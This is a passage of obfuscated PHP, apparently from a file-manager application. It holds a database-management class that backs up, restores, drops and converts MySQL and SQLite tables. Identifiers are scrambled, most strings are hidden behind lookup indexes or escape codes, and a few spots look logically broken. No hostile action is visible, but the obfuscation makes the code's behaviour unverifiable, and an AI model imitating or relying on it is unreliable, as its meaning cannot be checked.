$ñõ•Ğ‚¾[$ì«‚ÂÎû[500]] == $ì«‚ÂÎû[91]; $·ë´áÂ§ = $üÉªİÉ¹->fileNameAuto($ñõ•Ğ‚¾[$ì«‚ÂÎû[190]], $ñõ•Ğ‚¾[$ì«‚ÂÎû[32]], REPEAT_RENAME_FOLDER, $ñçÎ¨İÎ); if ($·ë´áÂ§ != $ñõ•Ğ‚¾[$ì«‚ÂÎû[32]]) { $üÉªİÉ¹->rename($…”ĞÚñî, $·ë´áÂ§); } $üÉªİÉ¹->where($œµ·²ÃÁ)->setField($ì«‚ÂÎû[520], 0); $ĞÍÜÍºï->eventRecycle($…”ĞÚñî, $ì«‚ÂÎû[959]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x73\x6f\165\162\143\x65\x53\x65\143\162\145\x74\114\151\x73\164"; public $field = array("\x73\x6f\165\162\x63\x65\111\104", "\164\171\x70\x65\x49\x44", "\143\x72\x65\141\x74\145\125\163\x65\162"); } goto e÷ÎŠÜµ¡Å; FÕ”‹ƒö†¥: class DbManage { public $message = ''; function __construct($½ÇûƒûÕ = array()) { $Ëí»÷¶‚ =& $_SERVER[¹Éµ„ºå]; if (empty($½ÇûƒûÕ)) { $½ÇûƒûÕ = $GLOBALS[$Ëí»÷¶‚[6]][$Ëí»÷¶‚[21]]; } $this->database = $½ÇûƒûÕ; } public function model($’”İû‚ì = '') { return new ModelBase($’”İû‚ì, $_SERVER[¹Éµ„ºå][12], $this->database); } public function db($’†Àõ·ç = false) { $ĞÏ¸’ÈĞ =& $_SERVER[¹Éµ„ºå]; $ç—óéü = array_change_key_case($this->database); if ($this->dbType() == $ĞÏ¸’ÈĞ[13] || !$’†Àõ·ç) { return $this->model()->db(); } $¼Ñ¢ÎÊÖ = $ç—óéü[$ĞÏ¸’ÈĞ[1129]]; $ç—óéü[$ĞÏ¸’ÈĞ[1129]] = $ĞÏ¸’ÈĞ[12]; if ($ç—óéü[$ĞÏ¸’ÈĞ[1124]] == $ĞÏ¸’ÈĞ[1121]) { $’ŠÈÊ¿Ù = $ç—óéü[$ĞÏ¸’ÈĞ[1130]]; $ç—óéü[$ĞÏ¸’ÈĞ[1130]] = substr($’ŠÈÊ¿Ù, 0, strrpos($’ŠÈÊ¿Ù, $ĞÏ¸’ÈĞ[1216])); } $this->database = $ç—óéü; $ùü×¶² = $this->model()->db(); $Ù²†…ìÚ = $ùü×¶²->execute("\x73\150\157\167\40\144\141\164\x61\142\141\x73\x65\163\x20\154\151\x6b\x65\x20\47{$¼Ñ¢ÎÊÖ}\47"); if (!$Ù²†…ìÚ) { try { $ùü×¶²->execute("\143\x72\145\x61\164\145\40\x64\x61\x74\x61\x62\141\x73\145\x20\x60{$¼Ñ¢ÎÊÖ}\140"); } catch (Exception $µëˆ¾¢£) { $this->message = $µëˆ¾¢£->getMessage(); return !1; } } $ç—óéü[$ĞÏ¸’ÈĞ[1129]] = $¼Ñ¢ÎÊÖ; if ($ç—óéü[$ĞÏ¸’ÈĞ[1124]] == $ĞÏ¸’ÈĞ[1121]) { $ç—óéü[$ĞÏ¸’ÈĞ[1130]] .= $ĞÏ¸’ÈĞ[1216] . $¼Ñ¢ÎÊÖ; } $this->database = $ç—óéü; try { $ùü×¶²->execute("\165\163\145\40\140{$¼Ñ¢ÎÊÖ}\140"); } catch (Exception $µëˆ¾¢£) { $this->message = $µëˆ¾¢£->getMessage(); return !1; } return $ùü×¶²; } public function createTable($¨ğïÕÒÜ, &$ò¦—àÖù) { $¢˜æŸñş =& $_SERVER[¹Éµ„ºå]; if (!IO::exist($¨ğïÕÒÜ)) { show_json(LNG($¢˜æŸñş[1217]), !1); } $üáû”Šã = $this->model()->db(); $Šäæúï» = IO::getContent($¨ğïÕÒÜ); $Šäæúï» = str_ireplace($¢˜æŸñş[1218], $¢˜æŸñş[1219], $Šäæúï»); $Ï„ù”¯Ç = sqlSplit($Šäæúï»); foreach ($Ï„ù”¯Ç as $àùĞŸ¬ú) { $‚ïµ™ÔÉ = stripos($àùĞŸ¬ú, $¢˜æŸñş[1220]) === 0; if ($‚ïµ™ÔÉ) { $ò¦—àÖù->task[$¢˜æŸñş[1221]] += 1; } $üáû”Šã->execute($àùĞŸ¬ú); if ($‚ïµ™ÔÉ) { preg_match($¢˜æŸñş[1222], $àùĞŸ¬ú, $Ù†”°Êå); $ò¦—àÖù->task[$¢˜æŸñş[1223]] = $Ù†”°Êå[1]; $ò¦—àÖù->update(1); } } } public function insertTable($†ã§Õò¤, &$‰µƒºıÒ) { $š­…ìßÕ =& $_SERVER[¹Éµ„ºå]; $Â†ŸÕ³Œ = $this->model()->db(); $£ô¡¯… = $¬äÍ©óí ? array($¬äÍ©óí) : $Â†ŸÕ³Œ->getTables(); foreach ($†ã§Õò¤ as $£ØèÊ´Ä) { $¬äÍ©óí = basename($£ØèÊ´Ä, $š­…ìßÕ[882]); if (!in_array($¬äÍ©óí, $£ô¡¯…)) { continue; } $‰µƒºıÒ->task[$š­…ìßÕ[1223]] = $¬äÍ©óí; if ($¬äÍ©óí == $š­…ìßÕ[472]) { continue; } if (get_filesize($£ØèÊ´Ä) == 0) { continue; } $úÓÉ×Õ· = $this->sqlToDb($£ØèÊ´Ä, $‰µƒºıÒ); if (!$úÓÉ×Õ·) { show_json(LNG($š­…ìßÕ[1224]) . "\133{$¬äÍ©óí}\x5d", !1); } } } public function sqlFromDb($ÈÊ†Æ ó, $ØØ”Ğ¦, &$ÍÈæ­Û, $úòóôÔŸ = '') { $‹¡ÇÇ€ =& $_SERVER[¹Éµ„ºå]; if ($ÍÈæ­Û) { $ÍÈæ­Û->task[$‹¡ÇÇ€[1223]] = $ÈÊ†Æ ó; } $’øâ¶™ó = $this->model($ÈÊ†Æ ó); $’Ÿª¨¸Ö = 0; $ÜÕ¸ùÁÏ = 0; $ıùòÂÅ„ = 10000; $Êóà†Ó… = fopen($ØØ”Ğ¦, $‹¡ÇÇ€[1225]); $¬é˜¸êÆ = $’øâ¶™ó->getPk(); $¶»¥À¢ = $’øâ¶™ó->getDbFields(); $ÓÏËæÉ¤ = $‹¡ÇÇ€[12]; if ($GLOBALS[$‹¡ÇÇ€[881]] && in_array($ÈÊ†Æ ó, array($‹¡ÇÇ€[1226], $‹¡ÇÇ€[1227]))) { $ÓÏËæÉ¤ = $ÈÊ†Æ ó; } do { $¢…Ç¾±’ = array($¬é˜¸êÆ => array($‹¡ÇÇ€[1171], $ÜÕ¸ùÁÏ)); $ÍÔà…ã¥ = $’øâ¶™ó->where($¢…Ç¾±’)->field($¶»¥À¢)->order($¬é˜¸êÆ . $‹¡ÇÇ€[1228])->limit($ıùòÂÅ„)->select(); $ÍÔà…ã¥ = !empty($ÍÔà…ã¥) ? $ÍÔà…ã¥ : array(); if (!($ú¸„¥£Ï = count($ÍÔà…ã¥))) { break; } $ĞÍÏ­× = end($ÍÔà…ã¥); $ÜÕ¸ùÁÏ = $ĞÍÏ­×[$¬é˜¸êÆ]; $Àšê¢Ğó = array(); foreach ($ÍÔà…ã¥ as $€ÄÑˆºÚ) { if ($ÓÏËæÉ¤) { if ($ÈÊ†Æ ó == $‹¡ÇÇ€[1226]) { if ($€ÄÑˆºÚ[$‹¡ÇÇ€[33]] == $‹¡ÇÇ€[1229]) { $šœ„Ñ = json_decode($€ÄÑˆºÚ[$‹¡ÇÇ€[451]], !0); if ($šœ„Ñ[$‹¡ÇÇ€[32]] == $GLOBALS[$‹¡ÇÇ€[881]] && $šœ„Ñ[$‹¡ÇÇ€[841]] != 1) { continue; } } } else { if ($€ÄÑˆºÚ[$‹¡ÇÇ€[33]] == $‹¡ÇÇ€[1230] && $€ÄÑˆºÚ[$‹¡ÇÇ€[95]] == $‹¡ÇÇ€[877]) { continue; } } } $Àšê¢Ğó[] = $‹¡ÇÇ€[1231] . $this->sqlEncode($€ÄÑˆºÚ) . $‹¡ÇÇ€[1232]; } $Ê€†˜Âö = "\x49\x4e\123\105\x52\x54\x20\x49\x4e\x54\117\x20\x60{$ÈÊ†Æ ó}\140\x20\50\x60" . implode($‹¡ÇÇ€[1233], $¶»¥À¢) . $‹¡ÇÇ€[1234]; fwrite($Êóà†Ó…, $Ê€†˜Âö . implode($‹¡ÇÇ€[1235], $Àšê¢Ğó) . $‹¡ÇÇ€[74] . PHP_EOL); $’Ÿª¨¸Ö += $ú¸„¥£Ï; if ($ÍÈæ­Û) { $ÍÈæ­Û->update($ú¸„¥£Ï); } } while ($ıùòÂÅ„ == $ú¸„¥£Ï); fclose($Êóà†Ó…); return $’Ÿª¨¸Ö; } public function sqlToDb($æ÷®È÷–, &$İÎŒÖÉí) { $ÀŠ¨Æİè =& $_SERVER[¹Éµ„ºå]; $üÍ»ììÆ = $this->model()->db(); $èÈ‰¿ = @fopen($æ÷®È÷–, $ÀŠ¨Æİè[1236]); if (!$èÈ‰¿) { return !1; } $©³ÖóÖ® = 0; $±öçÉ«Û = $ÀŠ¨Æİè[12]; $ÄÅ˜ê…¥ = array(); $şÊ¢Î˜Ú = $this->dbType(); $ã”™¬ = $şÊ¢Î˜Ú == $ÀŠ¨Æİè[13] ? 500 : 2000; $»ÊÍ¶ † = basename($æ÷®È÷–, $ÀŠ¨Æİè[882]); $òæê½Ø = 0; $‰ø“ã¿  = 4194304; while (!feof($èÈ‰¿)) { $¹¾ºù³• = trim(fgets($èÈ‰¿)); if (!$¹¾ºù³•) { continue; } $ü‹æ­ = $this->sqlDecode($¹¾ºù³•, $şÊ¢Î˜Ú, $»ÊÍ¶ †); if (stripos($ü‹æ­, $ÀŠ¨Æİè[430]) === 0) { if (!$±öçÉ«Û) { $±öçÉ«Û = $ü‹æ­ . $ÀŠ¨Æİè[53]; } continue; } if ($İÎŒÖÉí) { $İÎŒÖÉí->task[$ÀŠ¨Æİè[1221]] += 1; } $©³ÖóÖ®++; $ÄÅ˜ê…¥[] = rtrim(rtrim(trim($ü‹æ­), $ÀŠ¨Æİè[50]), $ÀŠ¨Æİè[74]); $Âœ³ö‰² = null; $ì‘Ì³¤ = strlen($ü‹æ­); $òæê½Ø += $ì‘Ì³¤; $ÑàÍµ‘› = strlen($±öçÉ«Û) + $òæê½Ø + (count($ÄÅ˜ê…¥) - 1); if ($ÑàÍµ‘› >= $‰ø“ã¿ ) { $Âœ³ö‰² = array_pop($ÄÅ˜ê…¥); if ($©³ÖóÖ® > 1) { $©³ÖóÖ®--; } } if ($©³ÖóÖ® >= $ã”™¬ || $Âœ³ö‰²) { $ü‹æ­ = $±öçÉ«Û . implode($ÀŠ¨Æİè[50], $ÄÅ˜ê…¥); if (!$üÍ»ììÆ->execute($ü‹æ­)) { return !1; } if ($İÎŒÖÉí) { $İÎŒÖÉí->update($©³ÖóÖ®); } $ÄÅ˜ê…¥ = array(); $©³ÖóÖ® = 0; $òæê½Ø = 0; if ($Âœ³ö‰²) { $ÄÅ˜ê…¥ = array($Âœ³ö‰²); $©³ÖóÖ® = 1; $òæê½Ø = $ì‘Ì³¤; } } } fclose($èÈ‰¿); if (!empty($ÄÅ˜ê…¥)) { $ü‹æ­ = $±öçÉ«Û . implode($ÀŠ¨Æİè[50], $ÄÅ˜ê…¥); if (!$üÍ»ììÆ->execute($ü‹æ­)) { return !1; } if ($İÎŒÖÉí) { $İÎŒÖÉí->update($©³ÖóÖ®); } } return !0; } public function dropTable($•ÑĞëôç = null) { $ÜòÈŠİ =& $_SERVER[¹Éµ„ºå]; $³®°àÀ = $this->model()->db(); $«ş¹Ï = $•ÑĞëôç ? array($•ÑĞëôç) : $³®°àÀ->getTables(); if (!$«ş¹Ï) { return; } foreach ($«ş¹Ï as $•ÑĞëôç) { if ($•ÑĞëôç) { $•ÑĞëôç = strtolower($•ÑĞëôç); } else { continue; } $³®°àÀ->execute($ÜòÈŠİ[1237] . $this->escapeName($•ÑĞëôç) . $ÜòÈŠİ[1238]); } } private function sqlEncode($ƒŞ¯Ó¯) { $˜ŞØÑŞ­ =& $_SERVER[¹Éµ„ºå]; $ƒ‡©ş¬ = array(); foreach ($ƒŞ¯Ó¯ as $ù¼“Óâñ) { if (is_array($ù¼“Óâñ)) { $ù¼“Óâñ = json_encode_force($ù¼“Óâñ); } $ù¼“Óâñ = addslashes($ù¼“Óâñ); $ù¼“Óâñ = str_replace(array($˜ŞØÑŞ­[1239], $˜ŞØÑŞ­[285], $˜ŞØÑŞ­[417]), array($˜ŞØÑŞ­[1240], $˜ŞØÑŞ­[1241], $˜ŞØÑŞ­[1242]), $ù¼“Óâñ); $ƒ‡©ş¬[] = $ù¼“Óâñ; } return $˜ŞØÑŞ­[58] . implode($˜ŞØÑŞ­[1243], $ƒ‡©ş¬) . $˜ŞØÑŞ­[58]; } private function sqlDecode($À¸¡ğ”, $ÍÕıó’, $œµÎôªğ = '') { $•øŞ·Œª =& $_SERVER[¹Éµ„ºå]; $À¸¡ğ” = str_replace(array($•øŞ·Œª[1240], $•øŞ·Œª[1241], $•øŞ·Œª[1242]), array($•øŞ·Œª[1239], $•øŞ·Œª[285], $•øŞ·Œª[417]), $À¸¡ğ”); if ($ÍÕıó’ == $•øŞ·Œª[13]) { $À¸¡ğ” = str_ireplace($•øŞ·Œª[1244], $•øŞ·Œª[59], $À¸¡ğ”); $À¸¡ğ” = stripslashes($À¸¡ğ”); } return preg_replace($•øŞ·Œª[1245], $•øŞ·Œª[12], $À¸¡ğ”); if ($ÍÕıó’ == $•øŞ·Œª[13]) { return $œµÎôªğ != $•øŞ·Œª[472] ? stripslashes($À¸¡ğ”) : $À¸¡ğ”; } if ($œµÎôªğ == $•øŞ·Œª[472]) { $À¸¡ğ” = str_replace($•øŞ·Œª[1246], $•øŞ·Œª[118], stripslashes($À¸¡ğ”)); } return $À¸¡ğ”; } public function getSqlFile($ôİÍ³… = '') { $ó…¡ì¢ô =& $_SERVER[¹Éµ„ºå]; $ãÃÉ‹‚ = $this->dbType(!0); $¥æ¡ƒ•Å = CONTROLLER_DIR . "\151\156\x73\164\x61\x6c\x6c\57\x64\x61\x74\x61\57{$ãÃÉ‹‚}\56\x73\x71\x6c"; if (!file_exists($¥æ¡ƒ•Å)) { return !1; } $½ó©ÈüÁ = file_get_contents($¥æ¡ƒ•Å); $˜ Ø©ÑÉ = $ó…¡ì¢ô[1247] . ($ãÃÉ‹‚ == $ó…¡ì¢ô[892] ? $ó…¡ì¢ô[1248] : $ó…¡ì¢ô[1249]) . $ó…¡ì¢ô[1250]; preg_match_all($˜ Ø©ÑÉ, $½ó©ÈüÁ, $Š‡Ïİâà); $Ø­‡İ¥ = $Š‡Ïİâà[1]; $É”ÙäıÖ = $this->model()->db(); $ıÊàÃµÅ = $É”ÙäıÖ->getTables(); $ıß‹€åì = TEMP_FILES . $ó…¡ì¢ô[1251] . date($ó…¡ì¢ô[259]) . $ó…¡ì¢ô[8]; del_dir($ıß‹€åì); mk_dir($ıß‹€åì); $Şš×òÆé = $ıß‹€åì . $ó…¡ì¢ô[1252]; $´²Öˆá½ = $ıß‹€åì . $ó…¡ì¢ô[1253]; $Ü²˜Œ¡˜ = $ãÃÉ‹‚ == $ó…¡ì¢ô[13] ? $ó…¡ì¢ô[892] : $ó…¡ì¢ô[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\141\x6c\154\x2f\x64\x61\x74\141\57{$Ü²˜Œ¡˜}\x2e\x73\x71\154", $ıß‹€åì); @touch($ıß‹€åì . $ãÃÉ‹‚ . $ó…¡ì¢ô[882]); $¸ÚÁª‰ = fopen($Şš×òÆé, $ó…¡ì¢ô[1225]); $Ş‡¶ÔªÙ = fopen($´²Öˆá½, $ó…¡ì¢ô[1225]); if ($ãÃÉ‹‚ == $ó…¡ì¢ô[13]) { $ıÊàÃµÅ = array_diff($ıÊàÃµÅ, array($ó…¡ì¢ô[875], $ó…¡ì¢ô[876])); $Á«¬¯ŠÚ = array($ó…¡ì¢ô[1254], $ó…¡ì¢ô[1255], $ó…¡ì¢ô[1256]); fwrite($Ş‡¶ÔªÙ, implode(PHP_EOL, $Á«¬¯ŠÚ) . PHP_EOL . PHP_EOL); foreach ($ıÊàÃµÅ as $œÂœ—ŞÚ) { $Ø“æİàı = $this->sqlFromSqlite($œÂœ—ŞÚ); if (!$Ø“æİàı[$ó…¡ì¢ô[13]]) { continue; } fwrite($Ş‡¶ÔªÙ, $Ø“æİàı[$ó…¡ì¢ô[13]] . PHP_EOL . PHP_EOL); if (!in_array($œÂœ—ŞÚ, $Ø­‡İ¥)) { fwrite($¸ÚÁª‰, $Ø“æİàı[$ó…¡ì¢ô[892]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ıÊàÃµÅ as $œÂœ—ŞÚ) { $Ø“æİàı = $this->sqlFromMysql($œÂœ—ŞÚ); if (!$Ø“æİàı[$ó…¡ì¢ô[892]]) { continue; } fwrite($¸ÚÁª‰, $Ø“æİàı[$ó…¡ì¢ô[892]] . PHP_EOL . PHP_EOL); if (!in_array($œÂœ—ŞÚ, $Ø­‡İ¥)) { fwrite($Ş‡¶ÔªÙ, $Ø“æİàı[$ó…¡ì¢ô[13]] . PHP_EOL . PHP_EOL); } } } fclose($¸ÚÁª‰); fclose($Ş‡¶ÔªÙ); $½ó©ÈüÁ = array($ó…¡ì¢ô[892] => $Şš×òÆé, $ó…¡ì¢ô[13] => $´²Öˆá½); return $ôİÍ³… ? $½ó©ÈüÁ[$ôİÍ³…] : $½ó©ÈüÁ; } public function dbType($òÌ†¨ˆª = false) { $ç¬½Äøğ =& $_SERVER[¹Éµ„ºå]; $¹™Ï·‚Ó = $òÌ†¨ˆª ? $GLOBALS[$ç¬½Äøğ[6]][$ç¬½Äøğ[21]] : $this->database; $¹™Ï·‚Ó = array_change_key_case($¹™Ï·‚Ó); $Íµ¦Òåå = $¹™Ï·‚Ó[$ç¬½Äøğ[1124]]; if ($Íµ¦Òåå == $ç¬½Äøğ[1121]) { $ÛÂ½Å„Ø = explode($ç¬½Äøğ[4], $¹™Ï·‚Ó[$ç¬½Äøğ[1130]]); $Íµ¦Òåå = $ÛÂ½Å„Ø[0]; } $à–Şš = array($ç¬½Äøğ[1257] => $ç¬½Äøğ[13], $ç¬½Äøğ[1069] => $ç¬½Äøğ[892]); if (isset($à–Şš[$Íµ¦Òåå])) { $Íµ¦Òåå = $à–Şš[$Íµ¦Òåå]; } return $Íµ¦Òåå; } public function sqlFromMysql($Ø½¶ò, $úìÁÑ× = '') { $ °øÂñ¯ =& $_SERVER[¹Éµ„ºå]; $â¹—×Å = array($ °øÂñ¯[892] => $ °øÂñ¯[12], $ °øÂñ¯[13] => $ °øÂñ¯[12]); $¿õµùÂÉ = $this->escapeName($Ø½¶ò); $“÷ªÇ‘¹ = $this->escapeName($Ø½¶ò, $ °øÂñ¯[13]); $ìùãÀÔ¯ = $this->model()->db(); $ÈÅ¿ªÒô = $ìùãÀÔ¯->query("\x73\150\157\167\40\143\x72\145\x61\164\x65\x20\x74\141\x62\154\x65\x20{$¿õµùÂÉ}\x3b"); if (!$ÈÅ¿ªÒô || !$ÈÅ¿ªÒô[0]) { return !1; } $›ƒ“Ì § = _get($ÈÅ¿ªÒô[0], $ °øÂñ¯[1258], $ °øÂñ¯[12]); if (!$›ƒ“Ì §) { return !1; } $§ŠàÀò = "\104\122\117\120\40\124\x41\102\x4c\105\40\x49\x46\40\x45\x58\111\123\x54\123\40{$¿õµùÂÉ}\x3b" . PHP_EOL . $›ƒ“Ì § . $ °øÂñ¯[74]; if ($úìÁÑ× == $ °øÂñ¯[892]) { return $§ŠàÀò; } $â¹—×Å[$ °øÂñ¯[892]] = $§ŠàÀò; $ˆæéÊşë = array_change_key_case($GLOBALS[$ °øÂñ¯[6]][$ °øÂñ¯[21]]); $¼ÓËÁ­ê = $ˆæéÊşë[$ °øÂñ¯[1129]]; $–æœÛ–Õ = $ °øÂñ¯[1259] . $¼ÓËÁ­ê . "\x27\40\101\x4e\x44\x20\x54\x41\x42\x4c\105\137\x4e\101\115\105\x20\x3d\x20{$“÷ªÇ‘¹}\x3b"; $òÌˆÔÂè = "\123\x48\117\127\x20\111\116\x44\105\130\x20\106\122\117\115\40{$¿õµùÂÉ}\73"; $…æ‚¿ø¿ = $ìùãÀÔ¯->query($–æœÛ–Õ); if (empty($…æ‚¿ø¿)) { return $úìÁÑ× ? $â¹—×Å[$úìÁÑ×] : $â¹—×Å; } $À…†”¶Í = $ìùãÀÔ¯->query($òÌˆÔÂè); $ä“œÂõ© = $ °øÂñ¯[12]; $Á¨ú¤¤æ = array(); foreach ($À…†”¶Í as $¾†›ŞÓ†) { if (!$ä“œÂõ© && $¾†›ŞÓ†[$ °øÂñ¯[1260]] == $ °øÂñ¯[1261]) { $ä“œÂõ© = $¾†›ŞÓ†[$ °øÂñ¯[1262]]; } if (isset($Á¨ú¤¤æ[$¾†›ŞÓ†[$ °øÂñ¯[1260]]])) { $Á¨ú¤¤æ[$¾†›ŞÓ†[$ °øÂñ¯[1260]]][$ °øÂñ¯[1263]][] = $¾†›ŞÓ†[$ °øÂñ¯[1262]]; continue; } $Á¨ú¤¤æ[$¾†›ŞÓ†[$ °øÂñ¯[1260]]] = array($ °øÂñ¯[1264] => $¾†›ŞÓ†[$ °øÂñ¯[1260]], $ °øÂñ¯[1263] => array($¾†›ŞÓ†[$ °øÂñ¯[1262]]), $ °øÂñ¯[1265] => $¾†›ŞÓ†[$ °øÂñ¯[1266]] == $ °øÂñ¯[91] ? 0 : 1); } $‚õ¬æ©Ø = array(); foreach ($Á¨ú¤¤æ as $¾†›ŞÓ†) { $ €ÔşĞš = $¾†›ŞÓ†[$ °øÂñ¯[1264]] == $ °øÂñ¯[1261]; $ø“ÙîÌò = $¾†›ŞÓ†[$ °øÂñ¯[1265]] == $ °øÂñ¯[91] && !$ €ÔşĞš ? $ °øÂñ¯[1267] : $ °øÂñ¯[12]; $ÌÑ¼÷¦Ç = $ °øÂñ¯[1268] . $Ø½¶ò . $ °øÂñ¯[11] . ($ €ÔşĞš ? $ °øÂñ¯[1269] : $¾†›ŞÓ†[$ °øÂñ¯[1264]]); $´ßˆ = $ °øÂñ¯[1270] . implode($ °øÂñ¯[1271], $¾†›ŞÓ†[$ °øÂñ¯[1263]]) . $ °øÂñ¯[1272]; $‚õ¬æ©Ø[] = sprintf($ °øÂñ¯[1273], $ °øÂñ¯[1274], $ø“ÙîÌò, $ °øÂñ¯[1275], $ÌÑ¼÷¦Ç, $ °øÂñ¯[1276], $Ø½¶ò, $´ßˆ); } $«ÛÕÚ = array(); $©öÛ½ä™ = array($ °øÂñ¯[1277] => $ °øÂñ¯[390], $ °øÂñ¯[1278] => $ °øÂñ¯[390], $ °øÂñ¯[364] => $ °øÂñ¯[390], $ °øÂñ¯[363] => $ °øÂñ¯[390], $ °øÂñ¯[1279] => $ °øÂñ¯[1280], $ °øÂñ¯[1281] => $ °øÂñ¯[1280], $ °øÂñ¯[1280] => $ °øÂñ¯[1280], $ °øÂñ¯[1282] => $ °øÂñ¯[1280], $ °øÂñ¯[282] => $ °øÂñ¯[1280], $ °øÂñ¯[1283] => $ °øÂñ¯[1280], $ °øÂñ¯[1284] => $ °øÂñ¯[1280], $ °øÂñ¯[1285] => $ °øÂñ¯[1286], $ °øÂñ¯[365] => $ °øÂñ¯[1286], $ °øÂñ¯[366] => $ °øÂñ¯[1286], $ °øÂñ¯[1287] => $ °øÂñ¯[1287]); foreach ($…æ‚¿ø¿ as $¾†›ŞÓ†) { $úìÁÑ× = _get($©öÛ½ä™, $¾†›ŞÓ†[$ °øÂñ¯[1288]], $¾†›ŞÓ†[$ °øÂñ¯[1289]]); $ªø¬ç¼Û = $¾†›ŞÓ†[$ °øÂñ¯[1290]] == $ °øÂñ¯[1052] ? $ °øÂñ¯[1291] : $ °øÂñ¯[1292]; $Ê×£¬÷Á = $¾†›ŞÓ†[$ °øÂñ¯[1293]] == $ä“œÂõ© ? $ °øÂñ¯[1294] : $ °øÂñ¯[12]; $®ŞúÇÁ« = $¾†›ŞÓ†[$ °øÂñ¯[1106]] ? strtoupper(str_replace($ °øÂñ¯[11], $ °øÂñ¯[12], $¾†›ŞÓ†[$ °øÂñ¯[1106]])) : $ °øÂñ¯[12]; $«ÛÕÚ[] = sprintf($ °øÂñ¯[1295], $¾†›ŞÓ†[$ °øÂñ¯[1293]], $úìÁÑ×, $ªø¬ç¼Û, $Ê×£¬÷Á, $®ŞúÇÁ«); } $Ö°ÆÓº£ = array("\104\122\x4f\120\40\124\101\x42\x4c\105\40\111\106\x20\x45\130\111\123\124\123\x20{$“÷ªÇ‘¹}\73", "\x43\x52\105\x41\124\x45\x20\124\x41\102\x4c\105\x20{$“÷ªÇ‘¹}\40\50", implode($ °øÂñ¯[50] . PHP_EOL, $«ÛÕÚ), $ °øÂñ¯[1296]); $â¼Ì·¤ = implode(PHP_EOL, array_merge($Ö°ÆÓº£, $‚õ¬æ©Ø)); if ($úìÁÑ× == $ °øÂñ¯[13]) { return $â¼Ì·¤; } $â¹—×Å[$ °øÂñ¯[13]] = $â¼Ì·¤; return $â¹—×Å; } public function sqlFromSqlite($ÚŸ…üß, $ ÎšÚæ = '') { $îƒ–îüá =& $_SERVER[¹Éµ„ºå]; $ãÆ‡’ôâ = array($îƒ–îüá[892] => $îƒ–îüá[12], $îƒ–îüá[13] => $îƒ–îüá[12]); $Â¾à¹¤ê = $this->escapeName($ÚŸ…üß); $ûªƒæøõ = $this->escapeName($ÚŸ…üß, $îƒ–îüá[13]); $ºÆÄ³‰ = $this->model()->db(); $›Ö€ªú¢ = "\x50\122\x41\x47\115\101\40\124\101\x42\114\x45\137\111\x4e\106\117\x20\50\x27{$ÚŸ…üß}\47\51"; $Ë‚ÂëÒí = "\123\x45\x4c\105\x43\124\40\52\x20\106\x52\x4f\x4d\40\x73\161\154\151\x74\x65\x5f\x6d\x61\x73\x74\x65\162\40\x57\110\105\122\105\40\164\142\x6c\x5f\x6e\x61\x6d\x65\x20\x3d\40\x27{$ÚŸ…üß}\x27"; $öÂ»‹æÑ = $ºÆÄ³‰->query($›Ö€ªú¢); if (empty($öÂ»‹æÑ)) { return $ ÎšÚæ ? $ãÆ‡’ôâ[$ ÎšÚæ] : $ãÆ‡’ôâ; } $Çş¥˜Ş¿ = $ºÆÄ³‰->query($Ë‚ÂëÒí); $³¯ÓóÁ£ = $™¤ÒÃ² = array(); foreach ($Çş¥˜Ş¿ as $çíªÌ¦) { if ($çíªÌ¦[$îƒ–îüá[33]] == $îƒ–îüá[357]) { $³¯ÓóÁ£[] = $çíªÌ¦[$îƒ–îüá[1297]]; } else { $™¤ÒÃ²[] = $çíªÌ¦[$îƒ–îüá[1297]]; } } $¤€¢ë¨è = array_merge(array("\104\x52\x4f\x50\x20\x54\x41\102\114\x45\x20\111\x46\x20\x45\130\x49\123\124\x53\40{$ûªƒæøõ}\x3b"), $³¯ÓóÁ£, $™¤ÒÃ²); $¤€¢ë¨è = implode($îƒ–îüá[74] . PHP_EOL, $¤€¢ë¨è) . $îƒ–îüá[74]; if ($ ÎšÚæ == $îƒ–îüá[13]) { return $¤€¢ë¨è; } $ãÆ‡’ôâ[$îƒ–îüá[13]] = $¤€¢ë¨è; $ó×ËˆÆ = $ƒÙÏ¾‡Æ = array(); $¯è‡èÍê = array(); $ùï×¼Öâ = array(); foreach ($Çş¥˜Ş¿ as $çíªÌ¦) { if ($çíªÌ¦[$îƒ–îüá[33]] == $îƒ–îüá[1298]) { $Â€Ù¤¿Á = $çíªÌ¦[$îƒ–îüá[1297]]; $Ÿï•Ñß” = stripos($Â€Ù¤¿Á, $îƒ–îüá[1267]) !== !1; $¡®·Ì³’ = stripos($Â€Ù¤¿Á, $îƒ–îüá[1261]) !== !1; preg_match($îƒ–îüá[1299], $Â€Ù¤¿Á, $Ø öıÆù); if (empty($Ø öıÆù)) { continue; } $İûÉ¸„ = array_map($îƒ–îüá[1300], explode($îƒ–îüá[50], $Ø öıÆù[1])); $ÍóÕãºÈ = array(); foreach ($İûÉ¸„ as $Í¬Í÷×î) { $Ç¼ôèşÙ = trim($Í¬Í÷×î, $îƒ–îüá[1301]); $ÍóÕãºÈ[] = $Ç¼ôèşÙ; $¯è‡èÍê[$Ç¼ôèşÙ] = !0; } $ùï×¼Öâ[] = array($îƒ–îüá[32] => $çíªÌ¦[$îƒ–îüá[32]], $îƒ–îüá[1297] => $Â€Ù¤¿Á, $îƒ–îüá[1302] => $Ÿï•Ñß”, $îƒ–îüá[1303] => $¡®·Ì³’, $îƒ–îüá[1304] => $ÍóÕãºÈ); } } $—· û§… = array($îƒ–îüá[1278] => $îƒ–îüá[1278], $îƒ–îüá[390] => $îƒ–îüá[1305], $îƒ–îüá[1286] => $îƒ–îüá[1306], $îƒ–îüá[1280] => $îƒ–îüá[1280], $îƒ–îüá[1287] => $îƒ–îüá[1307], $îƒ–îüá[1308] => $îƒ–îüá[1309]); $ú±ğîÊ = array($îƒ–îüá[451], $îƒ–îüá[168], $îƒ–îüá[540]); $Îîñóç“ = array($îƒ–îüá[390], $îƒ–îüá[1286], $îƒ–îüá[1308], $îƒ–îüá[1278]); foreach ($öÂ»‹æÑ as $çíªÌ¦) { $â§åôĞ® = $çíªÌ¦[$îƒ–îüá[32]]; $çˆÎ‹½¸ = strtolower($çíªÌ¦[$îƒ–îüá[33]]); if ($çˆÎ‹½¸ == $îƒ–îüá[1280] && isset($¯è‡èÍê[$â§åôĞ®])) { $ ÎšÚæ = in_array($â§åôĞ®, $ú±ğîÊ) ? $îƒ–îüá[1280] : $îƒ–îüá[1310]; } else { $ ÎšÚæ = _get($—· û§…, $çˆÎ‹½¸, $çˆÎ‹½¸); } if ($çíªÌ¦[$îƒ–îüá[57]] > 0) { 